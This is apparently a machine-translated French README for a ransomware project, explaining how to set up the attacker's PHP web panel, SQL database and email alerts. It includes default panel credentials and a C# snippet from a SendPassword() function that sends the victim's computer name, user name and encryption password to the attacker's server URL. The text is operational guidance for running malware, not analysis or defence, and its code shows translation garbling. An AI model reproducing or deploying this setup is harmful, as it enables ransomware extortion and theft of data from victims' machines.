Avertissement: dans cette vidéo, le panneau de l'attaquant n'a pas été affiché mais seulement la clé enregistrée dans le fichier pour que la vidéo dure moins.

Usage

Vous devez disposer d'un serveur Web qui prend en charge le langage de script php. Changez cette ligne avec votre URL. (Vous utilisez mieux la connexion Https pour éviter les écoutes)

Chaîne targetURL = "https://www.example.com/Server/write.php";

Le nom d'utilisateur et le mot de passe par défaut pour le webpanel (dans le fichier check.php) sont -> Nom d'utilisateur: test | Mot de passe: test

Importer la table sql dans votre base de données en important le fichier: import.sql

Définissez vos bases de données dans le fichier: connect_db.php

Si vous voulez également écrire un fichier pour chaque exécution de virus, passez au fichier: write.php et faites un commentaire de la ligne 37 à 43. Pour la confidentialité des informations, cela n'est pas recommandé
Définissez votre adresse électronique pour obtenir des informations également par courrier électronique (n'écrivez pas votre adresse électronique PERSONNELLE) à la ligne 47 du fichier write.php
Le script devrait écrire le paramètre GET dans une base de données et si vous voulez dans un fichier texte. Processus d'envoi en cours d'exécution dans la fonction SendPassword ()

      String info = "? Computer_name =" + computerName + "& userName =" + userName + "& password =" + password + "& allow = ransom";
      Var fullUrl = targetURL + info;
      Var conent = new System.Net.WebClient (). DownloadString (fullUrl);